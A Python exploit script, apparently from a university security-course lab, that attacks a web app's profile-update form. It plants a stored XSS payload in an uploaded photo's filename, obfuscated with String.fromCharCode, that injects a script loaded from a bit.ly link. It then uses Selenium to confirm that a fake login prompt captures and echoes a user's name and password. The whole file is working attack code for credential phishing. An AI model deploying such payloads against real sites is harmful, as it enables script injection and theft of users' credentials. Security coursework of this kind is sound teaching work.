import requests, sys, re, time, random, string

params = { 
    'username': 'pentest1',
    'password': 'pentest1'
}
if len(sys.argv) == 2:
    url = sys.argv[1]
else:
    url = 'http://1e20646419f415513131d83be200e0326560be38193c43242109fc7f9223.project.ssof.rnl.tecnico.ulisboa.pt'

resource = '/login'

s = requests.Session()

path = url + resource
r = s.post(url=path, data=params)

if len(s.cookies) == 0:
    resource = '/register'
    path = url + resource
    r = s.post(url=path, data=params)
    resource = '/login'
    path = url + resource
    r = s.post(url=path, data=params)
    if len(s.cookies) == 0:
        print("Login && registration not successful! :(")
        print("Usage:\n\tpython3 vulnX.py [username] [password]\n")
        exit(2)
    
resource = '/update_profile'
path = url + resource

params = { 
    'name': (None, ''),
    'currentpassword': (None, params['password']),
    'newpassword': (None, ''),
    'about': (None, ''),
    'photo': (' onerror=s=document.createElement(String.fromCharCode(115,99,114,105,112,116));s.src=String.fromCharCode(104,116,116,112,115,58,47,47,98,105,116,46,108,121,47,51,55,70,51,75,66,66);document.body.appendChild(s)', 'xss name')
}
r = s.post(url=path, files=params)

resource = '/create_post'
path = url + resource

params = { 
            'content': 'Just to see my XSS filename picture',
            'type': "Public"
}
r = s.post(url=path, data=params, allow_redirects=False)

from selenium.webdriver import Firefox
browser = Firefox()
browser.get('http://1e20646419f415513131d83be200e0326560be38193c43242109fc7f9223.project.ssof.rnl.tecnico.ulisboa.pt/login')
browser.find_element_by_name('username').send_keys("pentest1")
browser.find_element_by_name('password').send_keys("pentest1")
login_submit = '/html/body/div[2]/div/div[2]/center/form/fieldset/button'
browser.find_element_by_xpath(login_submit).click()

time.sleep(1)

send_name = "pentest1"
send_pass = "notRealPassword:-)"

browser.find_element_by_name('username').send_keys(send_name)
time.sleep(0.5)
browser.find_element_by_name('password').send_keys(send_pass)
time.sleep(0.5)
login_submit = '/html/body/div[2]/div/div[2]/center/form/fieldset/button'
browser.find_element_by_xpath(login_submit).click()

html_source = browser.page_source
line_should_be = 'Thank you ' + send_name + ' for your name and password: ' + send_pass
assert line_should_be in html_source
